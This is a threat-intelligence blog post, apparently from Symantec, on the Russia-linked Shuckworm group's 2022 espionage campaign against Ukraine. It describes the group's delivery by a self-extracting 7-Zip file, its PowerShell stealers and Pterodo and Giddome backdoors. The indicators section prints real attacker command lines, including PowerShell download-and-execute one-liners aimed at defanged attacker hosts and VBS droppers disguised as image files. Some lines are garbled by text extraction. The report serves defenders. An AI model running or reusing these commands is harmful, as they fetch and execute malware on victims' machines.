symantec-enterprise-blogs.security.com /blogs/threat-intelligence/russia-ukraine-shuckworm Shuckworm: Russia-Linked Group Maintains Ukraine FocusUPDATE, 17.40 BST, August 15, 2022: Update for clarity re use of VCD, ASC, and H264 file extensions in file names.UPDATE, 17.50 BST, August 17, 2022: Additional IOCs addedRecent Shuckworm activity observed by Symantec, a division of Broadcom Software, and aimed at Ukraine appears to be delivering information-stealing malware to targeted networks. This activity was ongoing as recently as August 8, 2022 and much of the activity observed in this campaign is consistent with activity that was highlighted by CERT-UA on July 26.The activity observed by Symantec began on July 15, and we have additional indicators of compromise (IOCs) and technical details to share about this campaign.Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. It is generally considered to be a state-sponsored espionage operation. Infection VectorThe first suspicious activity Symantec saw on victim systems was a self-extracting 7-Zip file, which was downloaded via the system’s default browser. Subsequently, mshta.exe downloaded an XML file, which was likely masquerading as an HTML application (HTA) file.These files were downloaded from the following domain: a0698649[.]xsph[.]ru. It has been publicly documented since May 2022 that subdomains of xsph[.]ru are associated with Shuckworm activity, and this domain was once again mentioned in CERT-UA’s July 26 publication about Shuckworm activity.This domain was also associated with an email that spoofed being from the Security Service of Ukraine and had “Intelligence Bulletin” in the subject line, according to CERT-UA. This being the case, it is most likely the 7-Zip file seen on victim networks in the campaign observed by Symantec was delivered to victims via email. Attack ChainThe downloading of the XML file onto victim networks was followed by the execution of a PowerShell stealer. We saw three versions of the same PowerShell stealer appear on the one system. It’s possible the attackers may have deployed multiple versions of the stealer, which were all very similar, as an attempt to evade detection.Two VBS downloaders that had the words “juice” and “justice” in their file names were also observed on victim machines. Analysis found that these were Backdoor.Pterodo, a well-known Shuckworm tool that Symantec blogged about earlier this year. These scripts are capable of calling PowerShell, uploading screenshots, and also executing code downloaded from a command-and-control (C&C) server.Various suspicious files containing “ntuser” in the file names were also seen on victim machines. We associate these “ntuser” files with Shuckworm activity, and many variants of them are malicious, with most detected as the Giddome backdoor, another well-known Shuckworm tool.1/6We saw various parent processes with file names that had VCD, H264 and ASC extensions. A file named ntuser.dat.tmcontainer.vcd was the parent process for a Giddome backdoor variant named ntuser.dat.tm.descendant.exe that was seen on victim machines. A suspicious file named ntuser.dat.tmcontainer.h264 had a child process named ntuser.dat.tm.declare.exe, another malicious Giddome backdoor binary. Elsewhere, a file named ntuser.dat.tmcontainer.asc had a child process named ntuser.dat.tm.decay.exe.VCD files are disc images of a CD or DVD and are recognized by Windows as an actual disc, similar to ISO files, which we commonly see malicious actors use to deliver payloads. An ASC file is an encrypted file that may contain text or binary information encoded as text, while an H264 file is a video file. However, filenames with the ntuser.dat.tmcontainer prefix are files that represent the registry.It’s not clear if these are the actual file types, or if the attackers are using these file names as a means of sowing confusion.The backdoor dropped on victim systems had the file name 4896.exe. This backdoor had multiple capabilities, including:Record audio using the microphone and upload the recorded files to a remote location Take screenshots and upload them Log and upload keystrokes Download and execute .exe files or download and load DLL filesThe legitimate remote desktop protocol (RDP) tools Ammyy Admin and AnyDesk were both also leveraged by the attackers for remote access. Legitimate RDP tools like these and others are frequently leveraged for remote access by attackers in both ransomware and nation-state-backed cyber attacks. Shuckworm Keeps Focus on UkraineThis campaign, combined with previous public reporting on Shuckworm, shows some patterns in the operations of the group at the moment, including its reuse of patterns, e.g. paths (such as csidl_profile\music), using files that contain "ntuser.dat" in the file name, using various artifacts that contain, for example, "judgement" in the file name, and also leveraging EXE files whose file names contain English words that begin with "D", “dat”, “decay”, “deer”, “declare”, etc.As the Russian invasion of Ukraine approaches the six-month mark, Shuckworm’s long-time focus on the country appears to be continuing unabated. That this recent activity continues even after CERT-UA documented it shows that fear of exposure does not deter the group from its activities. While Shuckworm is not necessarily the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations. Protection/MitigationFor the latest protection updates, please visit the Symantec Protection Bulletin. Indicators of CompromiseIf an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.SHA256 files destroy.asierdo[.]ru hxxp://destroy.asierdo[.]ru/ 45.63.94[.]49 165.22.215[.]30 149.28.99[.]187 45.63.79[.]134 140.82.58[.]157 139.180.172[.]67 141.164.45[.].236 95.179.167[.]182 140.82.47[.]97 159.223.235[.]224 138.68.254[.]91 217.163.30[.]126 144.202.54[.]111 159.89.129[.]22 207.246.80[.]1 hxxp://159.223.235[.]224/crab/crevice.elg a0698649.xsph[.]ru hxxp://a0698649.xsph[.]ru/preparations/band.xml 157.245.99[.]132 hxxp://157.245.99[.]132/get.php 194.180.174[.]73 hxxp://194.180.174[.]73/1.txt 155.138.252[.]221 hxxp://155.138.252[.]221/get.php 68.183.9[.]9 hxxp://68.183.9[.]9/get.php 178.62.108[.]75 hxxp://motoristo[.]ru/get.php 140.82.54[.]136 hxxp://heato[.]ru/index.php3/6leonardis[.]ru 104.238[.]187.145 141.8.192[.]82 139.59.65[.]168 hxxp://139.59.65[.]168/journal.au 45.63.100[.]72 hxxp://45.63.100[.]72/get.php?fr=3126424&se=3089412&dl=hxxps://meta[.]ua/uk/news/politics/52320-ukrayina- rozshirila-oboronnu-spivpratsyu-z- danieyu/&rm=hxxps://meta[.]ua/uk/&kf=false&ts=5875621&dw=2240&dh=1951&t=2053953&s=stable&eec=3242252&po=6485826&ju=82046 199.247.25[.]79 hxxp://199.247.25[.]79/get.phpCommand lines CSIDL_PROFILE\appdata\local\temp\1645694127.exe CSIDL_PROFILE\downloads\anydesk (2).exe CSIDL_PROFILE\ntuser.dat.tm.decay.exe CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\17634.bmp CSIDL_PROFILE\appdata\local\temp\17634.bmp.vbs CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\5491.bmp CSIDL_PROFILE\appdata\local\temp\5491.bmp.vbs CSIDL_SYSTEM\cmd.exe /c del /f /q CSIDL_PROFILE\29630.ico.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\17634.bmp CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\17634.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\5491.bmp CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\5491.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo '>>C:\Users\User\29630.ico CSIDL_SYSTEM\cmd.exe /c echo '>C:\Users\User\29630.ico.vbs CSIDL_SYSTEM\cmd.exe /c echo '17634.bmp>> CSIDL_PROFILE\appdata\local\temp\17634.bmp CSIDL_SYSTEM\cmd.exe /c echo '5491.bmp>> CSIDL_PROFILE\appdata\local\temp\5491.bmp CSIDL_SYSTEM\cmd.exe /c rename CSIDL_PROFILE\29630.ico 29630.ico.txt CSIDL_SYSTEM\cmd.exe /c rename CSIDL_PROFILE\29630.ico.txt 29630.ico.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\29630.ico.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\17634.bmp.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\5491.bmp.vbs CSIDL_SYSTEM\mshta.exe hxxp://a0698649.xsph[.]ru/preparations/band.xml /f CSIDL_SYSTEM\windowspowershell\v1.0\powershell.exe -nol -nop echo (INVOKE-EXPRESSION(new-object net.webclient).downloadstring('hxxp://157.245.99[.]132/get.php')) | powershell - CSIDL_SYSTEM\windowspowershell\v1.0\powershell.exe -windowstyle hidden -nologo Invoke-Expression CSIDL_SYSTEM\windowspowershell\v1.0\powershell.exe $aaa = (New-Object system.Net.WebClient).downloadString('hxxp://194.180.174[.]73/1.txt'); iex $aaa; CSIDL_SYSTEM\windowspowershell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get- Random)+'.pasamart.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/lnk.php'); Visible = $False};while ($IE1.ReadyState -ne 4) {Start-Sleep 2};$Doc = $IE1.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $IE1.document, $Null).InnerHtml;$IE1.quit();[io.file]::WriteAllText($($env:USERPROFILE+'\index.txt'),$Doc); iex(iex $Doc) CSIDL_SYSTEM\windowspowershell\v1.0\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hxxp://155.138.252[.]221/get.php'); Invoke-Expression $tmp CSIDL_SYSTEM\windowspowershell\v1.0\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hxxp://68.183.9[.]9/get.php'); Invoke-Expression $tmp CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\29630.ico.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\17634.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\5491.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\ho2btvivw2m.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\ntuser.dat.tmcontainer.asc //e:vbscript /deserve /decidedly /dene //b CSIDL_SYSTEMX86\windowspowershell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile CSIDL_SYSTEM\cmd.exe /c CSIDL_PROFILE\appdata\local\temp\7zsfx000.cmd CSIDL_SYSTEM\cmd.exe /c start /min powershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://motoristo[.]ru/get.php'))|powershell - ) CSIDL_WINDOWS\explorer.exe powershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://motoristo[.]ru/get.php'))|powershell - ) powershell -w hiddeN -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://sacramentos[.]ru/get.php'))|powershell - ) wscript.exe CSIDL_PROFILE\ntuser.dat.tmcontainer.asc //e:vbscript /deserve /decidedly /dene //b wscript.exe CSIDL_PROFILE\documents\jury.mp3 jenny //e:VBScript //b joke4/6CSIDL_PROFILE\cronos.exe CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\3893.bmp CSIDL_PROFILE\appdata\local\temp\3893.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\3893.bmp CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\3893.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo '3893.bmp>> CSIDL_PROFILE\appdata\local\temp\3893.bmp CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\3893.bmp.vbsCSIDL_SYSTEM\windowspowershell\v1.0\powershell.exe -nol -nop $nwc = new-object net.webclient;$nwc.headers['Accept']='image/avif,image/webp,*/*';$nwc.headers['Accept- Encoding']='*';$nwc.headers['Accept-Language']='en-US,en;q=0.5';$nwc.headers['Alt- Used']='www.facebook.com';$nwc.headers['Referer']='url Dest']='document';$nwc.headers['Sec-Fetch-Mode']='no-cors';$nwc.headers['Sec-Fetch-Site']='cross- site';$nwc.headers['TE']='trailers';$nwc.headers['User-Agent']='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0';$code= fr=3126424&se=3089412&dl=url danieyu/&rm=url $code|iexCSIDL_SYSTEM\windowspowershell\v1.0\powershell.exe $tmp = $(New-Object CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\3893.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\delve.prj //e:vbscript /departments /dependant /despite //b CSIDL_SYSTEM\cmd.exe /c CSIDL_PROFILE\appdata\local\temp\7zsfx000.cmd CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\10805.bmp CSIDL_PROFILE\appdata\local\temp\10805.bmp.vbs CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\14612.bmp CSIDL_PROFILE\appdata\local\temp\14612.bmp.vbs CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\19084.bmp CSIDL_PROFILE\appdata\local\temp\19084.bmp.vbs CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\20342.bmp CSIDL_PROFILE\appdata\local\temp\20342.bmp.vbs CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\26012.bmp CSIDL_PROFILE\appdata\local\temp\26012.bmp.vbs CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\5275.bmp CSIDL_PROFILE\appdata\local\temp\5275.bmp.vbs CSIDL_SYSTEM\cmd.exe /c copy /y CSIDL_PROFILE\appdata\local\temp\5491.bmp CSIDL_PROFILE\appdata\local\temp\5491.bmp.vbs CSIDL_SYSTEM\cmd.exe /c del /f /q CSIDL_PROFILE\30802.ico.vbs CSIDL_SYSTEM\cmd.exe /c del /f /q CSIDL_PROFILE\8527.ico.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\10805.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\14612.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\19084.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\20342.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\26012.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\5275.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo .> CSIDL_PROFILE\appdata\local\temp\5491.bmp.vbs CSIDL_SYSTEM\cmd.exe /c echo '>C:\Users\User\30802.ico.vbs CSIDL_SYSTEM\cmd.exe /c echo '>C:\Users\User\8527.ico.vbs CSIDL_SYSTEM\cmd.exe /c rename CSIDL_PROFILE\30802.ico.txt 30802.ico.vbs CSIDL_SYSTEM\cmd.exe /c rename CSIDL_PROFILE\8527.ico.txt 8527.ico.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\30802.ico.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\8527.ico.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\10805.bmp.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\14612.bmp.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\19084.bmp.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\20342.bmp.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\26012.bmp.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\5275.bmp.vbs CSIDL_SYSTEM\cmd.exe /c start /b CSIDL_PROFILE\appdata\local\temp\5491.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\30802.ico.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\8527.ico.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\10805.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\14612.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\19084.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\20342.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\26012.bmp.vbs5/6CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\5275.bmp.vbs CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\5491.bmp.vbs6/6 